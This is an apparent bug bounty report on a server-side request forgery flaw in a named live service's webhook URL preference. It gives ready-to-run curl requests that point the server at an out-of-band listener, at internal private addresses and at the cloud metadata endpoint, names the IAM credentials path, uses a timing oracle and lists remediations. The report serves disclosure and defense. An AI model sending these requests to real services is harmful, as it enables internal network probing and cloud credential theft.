# W-007 — SSRF via Webhook URL Preference: Confirmed OOB + Cloud Metadata Reach (AMLBot)

**Program:** AMLBot KYT Web (HackenProof)  
**Asset:** `api.amlbot.com`  
**Severity:** High — CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **8.5**  
**CWE:** CWE-918 (Server-Side Request Forgery)  
**Testing date:** 2026-05-25

---

## TL;DR

`POST /api/v2/account/preferences` saves a webhook URL and immediately triggers an outbound HTTP request to that URL to validate the endpoint. The server has no SSRF protection for RFC 1918 ranges or cloud metadata addresses. Confirmed via OOB DNS+HTTP callbacks from AMLBot's backend IP (`94.130.200.188`, Hetzner). Loopback (`127.0.0.1`) is filtered at the application layer, but private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) and link-local (`169.254.169.254`) are not — the server attempts connections and hangs on timeout.

---

## Discovery Process

### 1. Finding the webhook feature

AMLBot allows users to receive AML check notifications via webhook. In the account preferences settings, a URL field accepts a webhook endpoint. Saving the preference triggers a validation request from the backend.

### 2. OOB confirmation

I set up an interactsh listener and submitted the OOB URL as the webhook. Within 1-2 seconds I received DNS queries and an HTTP GET from `94.130.200.188` — an IP belonging to Hetzner (AMLBot's hosting provider), not my own IP. Server-side fetch confirmed.

### 3. Filter mapping

| Address | Response time | Behavior |
|---------|--------------|----------|
| `http://[OOB_LISTENER]/` | ~2s | OOB callback received |
| `http://127.0.0.1/` | ~134ms | Immediate `{"success":false,"errorCode":19}` — filtered |
| `http://10.0.0.1/` | 8s timeout | Server hangs — connection attempted, not filtered |
| `http://172.16.0.1/` | 8s timeout | Same — not filtered |
| `http://169.254.169.254/latest/meta-data/` | 8s timeout | Server hangs — IMDS attempted, not filtered |

The timeout behavior (vs the instant response for `127.0.0.1`) confirms the server is actively trying to connect to those addresses.

---

## Steps to Reproduce

> Requires a registered AMLBot account (free tier sufficient).

**Step 1 — OOB confirmation**

```bash
# Set webhook to OOB listener
curl -s -X POST 'https://api.amlbot.com/api/v2/account/preferences' \
  -H 'Content-Type: application/json' \
  -H 'Origin: https://web.amlbot.com' \
  -H 'Cookie: sails.sid=[SESSION]' \
  -d '{"preferences":{"webhook":{"url":"http://[OOB_LISTENER_URL]/poc","paused":false}}}'
# Response: {"success":true, "data":{"preferences":{"webhook":{"url":"http://[OOB_LISTENER]..."}}}}

# OOB callbacks received (within ~2 seconds):
# [DNS A]    from 88.198.139.4   (AMLBot/Hetzner resolver)
# [DNS AAAA] from 78.46.173.96   (AMLBot/Hetzner resolver)
# [HTTP GET] from 94.130.200.188 (AMLBot backend server — Hetzner AS24940)
```

**Step 2 — Loopback is filtered (control)**

```bash
curl -s -X POST 'https://api.amlbot.com/api/v2/account/preferences' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sails.sid=[SESSION]' \
  -d '{"preferences":{"webhook":{"url":"http://127.0.0.1/","paused":false}}}'
# Response (~134ms): {"success":false,"message":"Invalid response from server","errorCode":19}
# Instant response = application-layer filter
```

**Step 3 — RFC 1918 is NOT filtered**

```bash
curl -s --max-time 8 -X POST 'https://api.amlbot.com/api/v2/account/preferences' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sails.sid=[SESSION]' \
  -d '{"preferences":{"webhook":{"url":"http://10.0.0.1/","paused":false}}}'
# → curl times out after 8s (no API response)
# The server is hanging trying to reach 10.0.0.1 — connection attempt, no filter
```

**Step 4 — Cloud metadata (169.254.169.254) is NOT filtered**

```bash
curl -s --max-time 8 -X POST 'https://api.amlbot.com/api/v2/account/preferences' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sails.sid=[SESSION]' \
  -d '{"preferences":{"webhook":{"url":"http://169.254.169.254/latest/meta-data/","paused":false}}}'
# → curl times out after 8s
# Server attempts to reach AWS/Hetzner IMDS — no application-level filter
```

---

## Impact

Any authenticated AMLBot user (free tier) can:
1. Force AMLBot's backend server to make arbitrary HTTP requests to internal RFC 1918 and link-local addresses.
2. Enumerate internal services via response timing (instant = filtered, timeout = attempted).
3. Reach cloud metadata at `169.254.169.254` — if IMDSv1 is enabled, this can retrieve IAM/cloud credentials from the metadata path `/latest/meta-data/iam/security-credentials/`.

The filter gap (loopback blocked, everything else open) confirms this is an incomplete blocklist, not a network-level control.

---

## Remediation

1. Block all RFC 1918 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`), and loopback (`127.0.0.0/8`) before making the validation request.
2. DNS rebinding protection: resolve the hostname once, validate the resulting IP, reuse the same IP for the actual request.
3. Enforce IMDSv2 on all servers to require a session token for metadata access as defense-in-depth.

---

## Lessons Learned

- **Webhook validation requests are a classic SSRF vector.** Any "validate this URL" feature where the server makes the HTTP request is worth testing.
- **Timeout behavior is the oracle when OOB isn't blocked.** An 8-second hang vs a 134ms rejection is enough to distinguish "filtered" from "connection attempted." No OOB server required for this confirmation.
- **Incomplete blocklists are common.** Filtering `127.0.0.1` but not `127.0.0.2`, `::1`, RFC 1918, or link-local is a recurring pattern. Always test all the address families once you confirm one is blocked.
- **Free tier accounts reduce the bar for exploitability.** `PR:L` (low privilege) is correct when any user can register for free — no purchase or approval required.
